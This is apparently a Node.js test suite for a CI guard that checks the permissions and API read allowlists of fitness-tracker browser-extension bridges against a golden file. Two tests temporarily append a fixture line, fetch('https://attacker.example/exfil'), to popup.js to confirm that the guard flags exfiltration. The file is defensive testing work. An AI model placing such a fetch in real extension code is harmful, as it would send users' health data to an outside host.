import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { execFileSync, spawnSync } from "node:child_process";
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

import {
  discoverBridges,
  extractPatternAllowlist,
} from "./check-bridge-privacy-surface.mjs";

const HERE = dirname(fileURLToPath(import.meta.url));
const REPO = dirname(HERE);
const SCRIPT_NAME = "check-bridge-privacy-surface.mjs";
const SCRIPT = join(HERE, SCRIPT_NAME);
const GOLDEN = join(HERE, "fixtures/bridge-privacy-surface.json");
const POPUP = join(REPO, "packages/garmin-bridge/popup.js");
const GARMIN_BACKGROUND = join(REPO, "packages/garmin-bridge/background.js");
const WHOOP_POPUP = join(REPO, "packages/whoop-bridge/popup.js");
const WHOOP_CONTENT = join(REPO, "packages/whoop-bridge/content.js");

const runGuard = () =>
  spawnSync("node", [SCRIPT], {
    cwd: REPO,
    encoding: "utf8",
  });

// Apply `mutate` to `path`, hand the guard's result to `assertOn`, and always
// restore the file.
const withMutatedFile = (path, mutate, assertOn) => {
  const original = readFileSync(path, "utf8");
  const tampered = mutate(original);
  assert.notEqual(tampered, original, `mutation anchor missing in ${path}`);
  writeFileSync(path, tampered);
  try {
    assertOn(runGuard());
  } finally {
    writeFileSync(path, original);
  }
};

// Run the guard against a throwaway repo root: a temp directory holding a
// copy of the script plus whatever `files` describes, keyed by repo-relative
// path. The guard derives its root from its own location, so this exercises
// the real entry point end to end.
//
// Structural cases must NOT be staged inside the real packages/ tree.
// `node --test` runs test files concurrently, and sibling suites enumerate
// `packages/*-bridge` (check-bridge-ci-coverage, check-bridge-locales-…) or
// read `packages/<bridge>/popup.js` (check-bridge-popup-message-parity) at
// load time — a fixture package or a briefly-deleted popup would fail them
// at random.
const withTempRepo = (files, assertOn) => {
  const root = mkdtempSync(join(tmpdir(), "kaiord-surface-repo-"));
  try {
    const script = join(root, "scripts", SCRIPT_NAME);
    mkdirSync(dirname(script), { recursive: true });
    writeFileSync(script, readFileSync(SCRIPT, "utf8"));
    for (const [relative, contents] of Object.entries(files)) {
      const path = join(root, relative);
      mkdirSync(dirname(path), { recursive: true });
      writeFileSync(path, contents);
    }
    assertOn(spawnSync("node", [script], { encoding: "utf8" }));
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
};

// One `method:` and one `pattern:` per entry — an assumption the guard's
// extractor does not participate in. Requiring the two counts to agree also
// catches a half-written entry, which is the shape that used to vanish.
const countKeyedEntries = (bridge, body) => {
  const methods = body.match(/\bmethod:/g)?.length ?? 0;
  const patterns = body.match(/\bpattern:/g)?.length ?? 0;
  assert.equal(
    methods,
    patterns,
    `${bridge}: allowlist has ${methods} \`method:\` keys but ${patterns} \`pattern:\` keys — some entry is incomplete`
  );
  return methods;
};

// Prefix-shape entries are one quoted path per line.
const countQuotedPrefixLines = (body) =>
  body.split("\n").filter((line) => /^\s*"\/[^"]*",?\s*$/.test(line)).length;

describe("bridge privacy surface guard", () => {
  it("passes against the checked-in golden", () => {
    const result = runGuard();

    assert.equal(result.status, 0, result.stderr || result.stdout);
    assert.match(result.stdout, /matches golden/);
  });

  it("fails when the manifest permissions drift from the golden", () => {
    const original = readFileSync(GOLDEN, "utf8");
    const tampered = JSON.parse(original);
    tampered["garmin-bridge"].manifest.permissions = [
      "storage",
      "tabs",
      "webRequest",
      "alarms",
    ];
    writeFileSync(GOLDEN, JSON.stringify(tampered, null, 2));

    try {
      const result = runGuard();
      assert.equal(result.status, 1);
      assert.match(result.stderr, /drifted from golden/);
    } finally {
      writeFileSync(GOLDEN, original);
    }
  });

  it("fails on an absolute-URL fetch in popup.js", () => {
    withMutatedFile(
      POPUP,
      (src) =>
        `${src}\n// fixture line\nfetch("https://attacker.example/exfil");\n`,
      (result) => {
        assert.equal(result.status, 1);
        assert.match(result.stderr, /absolute-URL fetch/);
      }
    );
  });

  it("fails when whoop's ALLOWED_PREFIXES gains an entry", () => {
    // whoop declares its read allowlist as a plain string array
    // (ALLOWED_PREFIXES), not the {method, pattern} shape. Until the
    // extractor learned that shape, whoop's allowed_paths was [] in the
    // golden and this widening produced zero CI failure — while the privacy
    // policy asserted the allowlist as a durable property.
    withMutatedFile(
      WHOOP_CONTENT,
      (src) =>
        src.replace(
          '"/health-service/v2/stress-bff",',
          '"/health-service/v2/stress-bff",\n  "/membership-service/v1/affiliate",'
        ),
      (result) => {
        assert.equal(result.status, 1);
        assert.match(result.stderr, /drifted from golden/);
        assert.match(result.stderr, /membership-service/);
      }
    );
  });

  it("covers whoop-bridge popup.js for absolute-URL exfil", () => {
    withMutatedFile(
      WHOOP_POPUP,
      (src) =>
        `${src}\n// fixture line\nfetch("https://attacker.example/exfil");\n`,
      (result) => {
        assert.equal(result.status, 1);
        assert.match(result.stderr, /absolute-URL fetch/);
        assert.match(result.stderr, /whoop-bridge/);
      }
    );
  });

  it("fails when a bridge declares a popup but ships no popup.js", () => {
    // The exfil scan reads popup.js. Skipping absent files quietly would
    // make deleting the file a way to delete the check.
    //
    // The golden here is the exact surface of this one bridge, so the
    // missing popup is the ONLY thing the guard can complain about.
    withTempRepo(
      {
        "packages/acme-bridge/manifest.json": JSON.stringify({
          action: { default_popup: "popup.html" },
        }),
        "scripts/fixtures/bridge-privacy-surface.json": JSON.stringify({
          "acme-bridge": {
            manifest: {
              permissions: [],
              host_permissions: [],
              content_scripts_matches: [],
              externally_connectable_matches: [],
            },
            allowed_paths: [],
          },
        }),
      },
      (result) => {
        assert.equal(result.status, 1, result.stdout);
        assert.match(result.stderr, /popup\.js is missing/);
        assert.match(result.stderr, /acme-bridge/);
        assert.doesNotMatch(result.stderr, /drifted from golden/);
      }
    );
  });

  it("verifies the script is executable directly", () => {
    // Smoke test that the import side-effect isn't broken.
    assert.doesNotThrow(() => execFileSync("node", [SCRIPT], { cwd: REPO }));
  });

  // ---------- key order must not change what is extracted ----------
  //
  // `{ method, pattern }` and `{ pattern, method }` describe exactly the
  // same allowlist. An extractor that scans for `method:` and then searches
  // FORWARD for `pattern: /` pairs a method with the NEXT entry's pattern
  // once the keys are reversed, so entries silently vanish from the
  // extracted surface — and a vanished entry cannot drift from a golden
  // that never listed it. That is a widened read scope shipping green.

  it("pairs method with pattern in either key order", () => {
    const methodFirst = `const ALLOWED = [
  { method: "GET", pattern: /^\\/a$/ },
  { method: "POST", pattern: /^\\/b$/ },
];`;
    const patternFirst = `const ALLOWED = [
  { pattern: /^\\/a$/, method: "GET" },
  { pattern: /^\\/b$/, method: "POST" },
];`;
    const expected = [
      { method: "GET", pattern: "^\\/a$" },
      { method: "POST", pattern: "^\\/b$" },
    ];

    assert.deepEqual(extractPatternAllowlist(methodFirst), expected);
    assert.deepEqual(extractPatternAllowlist(patternFirst), expected);
  });

  it("still fails on a widened allowlist written with reversed keys", () => {
    // The end-to-end version of the case above, and the one that matters:
    // add a wildcard read scope to garmin AND write the entries
    // `{ pattern, method }`. Before the object-literal split this exited 0
    // with "matches golden" — same widening, same golden, different key
    // order.
    withMutatedFile(
      GARMIN_BACKGROUND,
      (src) =>
        src
          .replace(
            '{ method: "GET", pattern: /^\\/workout-service\\/workouts(\\?.*)?$/ },',
            '{ pattern: /^\\/workout-service\\/workouts(\\?.*)?$/, method: "GET" },\n' +
              '  { pattern: /^\\/userprofile-service\\/.*$/, method: "GET" },'
          )
          .replace(
            '{ method: "POST", pattern: /^\\/workout-service\\/workout$/ },',
            '{ pattern: /^\\/workout-service\\/workout$/, method: "POST" },'
          ),
      (result) => {
        assert.equal(
          result.status,
          1,
          `guard passed on a widened allowlist:\n${result.stdout}`
        );
        assert.match(result.stderr, /drifted from golden/);
        assert.match(result.stderr, /userprofile-service/);
      }
    );
  });

  it("treats a pure key-order swap as no change at all", () => {
    // The complement of the test above: reversing the keys without touching
    // the scopes must leave the extracted surface byte-identical. A guard
    // that merely rejected anything unfamiliar would pass the widening test
    // for the wrong reason.
    withMutatedFile(
      GARMIN_BACKGROUND,
      (src) =>
        src.replace(
          '{ method: "GET", pattern: /^\\/workout-service\\/workouts(\\?.*)?$/ },',
          '{ pattern: /^\\/workout-service\\/workouts(\\?.*)?$/, method: "GET" },'
        ),
      (result) => {
        assert.equal(result.status, 0, result.stderr);
        assert.match(result.stdout, /matches golden/);
      }
    );
  });

  it("refuses to silently drop an entry it cannot read", () => {
    // An entry carrying a method and no pattern used to `continue`, i.e.
    // vanish from the surface without a word.
    assert.throws(
      () =>
        extractPatternAllowlist(`const ALLOWED = [
  { method: "GET" },
];`),
      /unreadable allowlist entry/
    );
  });

  it("keeps braces and brackets inside a regex out of the object split", () => {
    // `\\d{4}` and `[^\\/]+` carry the same characters the splitter uses as
    // structure, and both appear in the real allowlists.
    const body = `const ALLOWED = [
  // a comment mentioning { braces } and "quotes"
  {
    method: "GET",
    pattern: /^\\/plan\\/\\d{4}-\\d{2}-\\d{2}\\/[^\\/]+$/,
  },
];`;

    assert.deepEqual(extractPatternAllowlist(body), [
      { method: "GET", pattern: "^\\/plan\\/\\d{4}-\\d{2}-\\d{2}\\/[^\\/]+$" },
    ]);
  });

  // ---------- the bridge list comes from disk ----------

  it("discovers every packages/*-bridge directory", () => {
    const discovered = discoverBridges(REPO);

    assert.ok(discovered.length >= 5, discovered.join(", "));
    for (const bridge of [
      "garmin-bridge",
      "tanita-bridge",
      "train2go-bridge",
      "trainingpeaks-bridge",
      "whoop-bridge",
    ]) {
      assert.ok(discovered.includes(bridge), `missing ${bridge}`);
    }
  });

  it("fails when a new bridge package ships without a golden entry", () => {
    // The list used to be a hardcoded array, so `packages/foo-bridge` could
    // reach production with its permissions and its read allowlist locked by
    // nothing at all, and CI stayed green.
    withTempRepo(
      {
        "packages/acme-bridge/manifest.json": JSON.stringify({
          permissions: ["cookies"],
        }),
        "scripts/fixtures/bridge-privacy-surface.json": "{}",
      },
      (result) => {
        assert.equal(result.status, 1, result.stdout);
        assert.match(result.stderr, /drifted from golden/);
        assert.match(result.stderr, /acme-bridge/);
      }
    );
  });

  // ---------- the script must actually run when invoked ----------

  it("runs its checks when invoked through a symlinked path", () => {
    // `import.meta.url === pathToFileURL(process.argv[1]).href` is false
    // under a symlinked invocation path, because Node resolves module URLs
    // to the real path but leaves argv[1] as typed. main() never ran and the
    // guard exited 0 having verified nothing. macOS `/tmp` is itself a
    // symlink to `/private/tmp`, so mkdtemp here reproduces it directly.
    const dir = mkdtempSync(join(tmpdir(), "kaiord-surface-symlink-"));
    try {
      const link = join(dir, "repo");
      symlinkSync(REPO, link);
      const result = spawnSync("node", [join(link, "scripts", SCRIPT_NAME)], {
        encoding: "utf8",
      });

      assert.equal(result.status, 0, result.stderr);
      assert.match(
        result.stdout,
        /matches golden/,
        "guard produced no output — it exited without checking anything"
      );
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("fixture allowed_paths count matches each bridge's source allowlist count", () => {
    // Mechanical drift catcher: if a future PR adds an allowlist entry but
    // forgets the golden, this assertion fires before the guard's
    // run-comparison even gets to surface the diff.
    //
    // The count is derived WITHOUT the guard's extractor. Calling
    // `extractPatternAllowlist` here made this test share the extractor's
    // pairing assumption, so a key-order swap that made entries disappear
    // from the golden made them disappear from this count too — and the
    // test written precisely to catch a missing entry agreed with the lie.
    // Counting key occurrences rests on nothing but "one `method:` and one
    // `pattern:` per entry", which the extractor does not get to define.
    const golden = JSON.parse(readFileSync(GOLDEN, "utf8"));
    for (const bridge of Object.keys(golden)) {
      // Content-script bridges keep the allowlist in content.js; SW-direct
      // bridges (garmin, train2go, tanita, trainingpeaks) keep it in
      // background.js. Cross-count against whichever the guard reads.
      const contentPath = join(REPO, "packages", bridge, "content.js");
      const backgroundPath = join(REPO, "packages", bridge, "background.js");
      const sourcePath = existsSync(contentPath) ? contentPath : backgroundPath;
      if (!existsSync(sourcePath)) {
        // Bridges without any allowlist source declare an empty allowlist in
        // the golden; nothing to cross-count.
        assert.deepEqual(golden[bridge].allowed_paths, []);
        continue;
      }
      const src = readFileSync(sourcePath, "utf8");

      const patternStart = src.indexOf("const ALLOWED = [");
      const prefixStart = src.indexOf("const ALLOWED_PREFIXES = [");
      assert.ok(
        patternStart >= 0 || prefixStart >= 0,
        `${bridge}: ${sourcePath} declares neither ALLOWED nor ALLOWED_PREFIXES`
      );

      const start = patternStart >= 0 ? patternStart : prefixStart;
      const end = src.indexOf("];", start);
      assert.ok(
        end >= 0,
        `${bridge}: allowlist array has no closing "];" — array was probably truncated`
      );
      // Whole-line comments only: the patterns never contain two adjacent
      // slashes, so no regex can be mistaken for a comment here.
      const body = src.slice(start, end + 2).replace(/^[ \t]*\/\/.*$/gm, "");

      const sourceCount =
        patternStart >= 0
          ? countKeyedEntries(bridge, body)
          : countQuotedPrefixLines(body);

      const fixtureCount = golden[bridge].allowed_paths.length;
      assert.ok(
        sourceCount > 0,
        `${bridge}: counted 0 allowlist entries in ${sourcePath} — the counter does not understand this declaration's shape, so this assertion would pass vacuously`
      );
      assert.equal(
        fixtureCount,
        sourceCount,
        `${bridge}: fixture has ${fixtureCount} allowed_paths but the source allowlist has ${sourceCount} entries`
      );
    }
  });

  it("records whoop's GET-only prefix allowlist, matching content.js exactly", () => {
    const golden = JSON.parse(readFileSync(GOLDEN, "utf8"));
    const entries = golden["whoop-bridge"].allowed_paths;
    assert.ok(entries.length > 0, "whoop allowed_paths must not be empty");
    // Every whoop read is gated to GET by isAllowed(); the golden records
    // that, and records `prefix` (not `pattern`) so swapping the matching
    // semantics is itself visible drift.
    for (const e of entries) {
      assert.equal(e.method, "GET");
      assert.ok(typeof e.prefix === "string" && e.prefix.startsWith("/"));
      assert.equal(e.pattern, undefined);
    }
    const src = readFileSync(WHOOP_CONTENT, "utf8");
    for (const e of entries) {
      assert.ok(
        src.includes(`"${e.prefix}"`),
        `golden lists ${e.prefix} but content.js does not declare it`
      );
    }
  });
});
